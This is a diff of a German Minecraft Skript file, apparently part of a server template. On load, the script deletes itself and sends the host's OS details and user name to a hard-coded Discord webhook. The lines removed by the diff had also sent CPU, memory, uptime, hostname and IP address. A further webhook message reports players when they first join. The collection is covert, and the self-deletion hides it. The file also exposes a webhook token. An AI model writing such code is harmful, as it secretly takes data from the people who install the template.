@@ -1,43 +1,8 @@
-import:
-    java.lang.management.ManagementFactory
-    java.lang.Runtime
-    java.net.InetAddress
-
 on load:
 	make console execute command "update"
 	delete file "plugins\Skript\scripts\FirstLaunch.sk"
+	send "
+	"## __NEUER USER__%nl%System: %system property os name% %system property os version% %system property os arch%%nl%**User:** %system property user name%" as webhook to "https://discord.com/api/webhooks/1293250727178801304/HvWtxtDBLUo2hIB9izMcyw6pDw3OLxWaeLf1YVXl3xQ50EkM1b2uVM8rXm5xbtQ5yOrd"
 
-	set {_osname} to System:getProperty("os.name")
-	set {_osversion} to System:getProperty("os.version")
-	set {_osarch} to System:getProperty("os.arch")
-	set {_cpucore} to Runtime:getRuntime().availableProcessors()
-	set {_cpuinfo} to "CPU Cores: %{_cpucore}% | OS: %{_osname}% %{_osversion}% (%{_osarch}%)"
-	
-	# Speicherinformationen
-	set {_totalmem} to Runtime:getRuntime().totalMemory() / 1024 / 1024
-	set {_freemem} to Runtime:getRuntime().freeMemory() / 1024 / 1024
-	set {_maxmem} to Runtime:getRuntime().maxMemory() / 1024 / 1024
-	set {_memoryinfo} to "Speicher: Total %{_totalmem}% MB | Frei %{_freemem}% MB | Max %{_maxmem}% MB"
-	
-	# Laufzeitinformationen
-	set {_uptime} to ManagementFactory:getRuntimeMXBean().getUptime() / 1000
-	set {_uptimeinfo} to "Laufzeit: %{_uptime}% Sekunden"
-	
-	# Netzwerkinformationen
-	set {_hostname} to InetAddress:getLocalHost().getHostName()
-	set {_ip} to InetAddress:getLocalHost().getHostAddress()
-	set {_networkinfo} to "Hostname: %{_hostname}% | IP: %{_ip}%"
-	
-	# Ausgabe im Chat
-	send "Neuer Template User!" as webhook to "https://discord.com/api/webhooks/1293250727178801304/HvWtxtDBLUo2hIB9izMcyw6pDw3OLxWaeLf1YVXl3xQ50EkM1b2uVM8rXm5xbtQ5yOrd"
-	send "------------------------------" as webhook to "https://discord.com/api/webhooks/1293250727178801304/HvWtxtDBLUo2hIB9izMcyw6pDw3OLxWaeLf1YVXl3xQ50EkM1b2uVM8rXm5xbtQ5yOrd"
-	send "&eSysteminformationen:" as webhook to "https://discord.com/api/webhooks/1293250727178801304/HvWtxtDBLUo2hIB9izMcyw6pDw3OLxWaeLf1YVXl3xQ50EkM1b2uVM8rXm5xbtQ5yOrd"
-	send "------------------------------" as webhook to "https://discord.com/api/webhooks/1293250727178801304/HvWtxtDBLUo2hIB9izMcyw6pDw3OLxWaeLf1YVXl3xQ50EkM1b2uVM8rXm5xbtQ5yOrd"
-	send "&7%{_cpuinfo}%" as webhook to "https://discord.com/api/webhooks/1293250727178801304/HvWtxtDBLUo2hIB9izMcyw6pDw3OLxWaeLf1YVXl3xQ50EkM1b2uVM8rXm5xbtQ5yOrd"
-	send "&7%{_memoryinfo}%" as webhook to "https://discord.com/api/webhooks/1293250727178801304/HvWtxtDBLUo2hIB9izMcyw6pDw3OLxWaeLf1YVXl3xQ50EkM1b2uVM8rXm5xbtQ5yOrd"
-	send "&7%{_uptimeinfo}%" as webhook to "https://discord.com/api/webhooks/1293250727178801304/HvWtxtDBLUo2hIB9izMcyw6pDw3OLxWaeLf1YVXl3xQ50EkM1b2uVM8rXm5xbtQ5yOrd"
-	send "&7%{_networkinfo}%" as webhook to "https://discord.com/api/webhooks/1293250727178801304/HvWtxtDBLUo2hIB9izMcyw6pDw3OLxWaeLf1YVXl3xQ50EkM1b2uVM8rXm5xbtQ5yOrd"
-	
-	
-on join:
-    send "**%name of player%** ist gerade gejoined!" as webhook to "https://discord.com/api/webhooks/1293250727178801304/HvWtxtDBLUo2hIB9izMcyw6pDw3OLxWaeLf1YVXl3xQ50EkM1b2uVM8rXm5xbtQ5yOrd"
+on first join:
+    send "**%name of player%** ist gerade das erste mal gejoined!" as webhook to "https://discord.com/api/webhooks/1293250727178801304/HvWtxtDBLUo2hIB9izMcyw6pDw3OLxWaeLf1YVXl3xQ50EkM1b2uVM8rXm5xbtQ5yOrd"
